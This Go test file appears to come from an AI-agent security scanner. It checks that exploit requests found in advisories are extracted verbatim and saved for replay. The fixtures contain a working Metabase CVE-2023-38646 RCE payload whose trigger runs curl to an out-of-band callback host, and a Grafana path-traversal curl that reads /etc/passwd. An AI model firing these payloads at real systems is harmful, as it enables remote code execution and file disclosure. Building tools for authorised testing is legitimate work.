package agent

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/xalgord/xalgorix/v4/internal/scanctx"
)

func newTestCtxStateWithDir(t *testing.T) (*scanctx.ScanContext, *ScanState) {
	t.Helper()
	id := "advisory-artifact-test-" + t.Name()
	ctx := scanctx.New(id, t.TempDir())
	scanctx.Activate(ctx)
	t.Cleanup(func() { scanctx.Deactivate(id) })
	state := NewScanState()
	state.ScanContextID = id
	return ctx, state
}

// The r11-metabase PoC shape: nested JSON with \uXXXX escapes that MUST be
// preserved byte-for-byte by extraction (reconstruction is the failure mode
// this mechanism exists to prevent).
const advisoryOutputWithPoC = `Here is a public PoC for CVE-2023-38646 — pre-auth remote code execution on Metabase 0.46.6:

POST /api/setup/validate
Content-Type: application/json

{"token":"<setup-token>","details":{"is_on_demand":false,"is_full_sync":false,"db":{"engine":"h2","details":{"db":"jdbc:h2:mem:x;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE TRIGGER q BEFORE INSERT ON information_schema.tables AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec('curl https://cb.oast.live/')\u000A$$"},"dbname":"x"}}}

Send it to the vulnerable instance.`

func TestExtractLargestRequestBlockPreservesEscapesVerbatim(t *testing.T) {
	got := extractLargestRequestBlock(advisoryOutputWithPoC)
	if got == "" {
		t.Fatal("expected a request block to be extracted")
	}
	// The extracted bytes must be IDENTICAL to the source fragment: nested
	// JSON quotes, the \u000A/\u0009 escapes, and the $$-delimited trigger
	// must survive untouched.
	for _, want := range []string{
		`"details":{"is_on_demand":false`,
		`jdbc:h2:mem:x;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE TRIGGER`,
		`\u000A\u0009java.lang.Runtime.getRuntime().exec`,
		`$$//javascript`,
		`"dbname":"x"`,
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("extracted block lost verbatim fragment %q:\n%s", want, got)
		}
	}
	if !strings.HasPrefix(got, `{"token"`) {
		t.Fatalf("extraction must start at the outer brace: %q", got[:40])
	}
}

func TestExtractLargestRequestBlockFencedCurl(t *testing.T) {
	out := `Grafana 8.2.2 path traversal PoC:

~~~
curl --path-as-is http://target:3000/public/plugins/text/../../../../../../../../etc/passwd
~~~

Further prose about the advisory with no request shape beyond this sentence padding.`
	got := extractLargestRequestBlock(out)
	if !strings.Contains(got, "curl --path-as-is") {
		t.Fatalf("fenced curl command not extracted: %q", got)
	}
	if strings.Contains(got, "Further prose") {
		t.Fatal("extraction must not bleed past the fence")
	}
}

func TestExtractLargestRequestBlockRejectsProse(t *testing.T) {
	if got := extractLargestRequestBlock("CVE-2023-38646 is an RCE in Metabase. No code here despite some /api/setup/validate route mention that is too short to be a request body."); got != "" {
		t.Fatalf("prose must not extract, got %q", got)
	}
}

func TestHookAdvisoryLeadPersistsVerbatimRequestArtifact(t *testing.T) {
	_, state := newTestCtxStateWithDir(t)
	state.ProfessionalAssessment = true
	result := hookAdvisoryLeadCommitment(state, map[string]string{
		"tool_name": "web_search",
		"query":     "CVE-2023-38646 metabase exploit request",
		"output":    advisoryOutputWithPoC,
	})
	if !strings.Contains(result.Nudge, "ADVISORY LEAD COMMITTED") {
		t.Fatalf("expected committed nudge, got: %s", result.Nudge)
	}
	if !strings.Contains(result.Nudge, "--data @") {
		t.Fatalf("nudge must instruct file-based replay: %s", result.Nudge)
	}
	path := filepath.Join(scanctx.Get(state.ScanContextID).ScanDir, "advisory-replay", "CVE-2023-38646.request.txt")
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("artifact not persisted: %v", err)
	}
	if !strings.Contains(string(data), `\u000A\u0009java.lang.Runtime`) {
		t.Fatalf("artifact must contain the verbatim escaped trigger, got: %s", data[:min(200, len(data))])
	}
	if !strings.Contains(string(data), `"token":"<setup-token>"`) {
		t.Fatal("artifact must be byte-identical to the extracted block")
	}
}

func TestHookOASTVerificationWorkflowEscalatesOnRepeatedPositivePolls(t *testing.T) {
	_, state := newTestCtxStateWithDir(t)
	poll := func() HookResult {
		return hookOASTVerificationWorkflow(state, map[string]string{
			"tool_name": "oob_callback",
			"action":    "poll",
			"token":     "tok42",
			"output":    "⚠️ 3 OOB interaction(s) observed for token tok42 ...",
		})
	}
	first := poll()
	if !strings.Contains(first.Nudge, "OAST CALLBACK OBSERVED") {
		t.Fatalf("first positive poll must nudge verify_oob: %s", first.Nudge)
	}
	// Repeated positive polls must escalate, bounded at 3 reminders.
	for i := 1; i <= 3; i++ {
		again := poll()
		if !strings.Contains(again.Nudge, "STILL UNCLASSIFIED") {
			t.Fatalf("reminder %d must escalate: %s", i, again.Nudge)
		}
	}
	if fifth := poll(); fifth.Nudge != "" {
		t.Fatalf("reminders must stop after the bounded count: %s", fifth.Nudge)
	}
	// A different token nudges normally.
	other := hookOASTVerificationWorkflow(state, map[string]string{
		"tool_name": "oob_callback", "action": "poll", "token": "tok43",
		"output": "2 OOB interaction(s) observed for token tok43",
	})
	if !strings.Contains(other.Nudge, "OAST CALLBACK OBSERVED") {
		t.Fatal("a new token must get the fresh nudge")
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
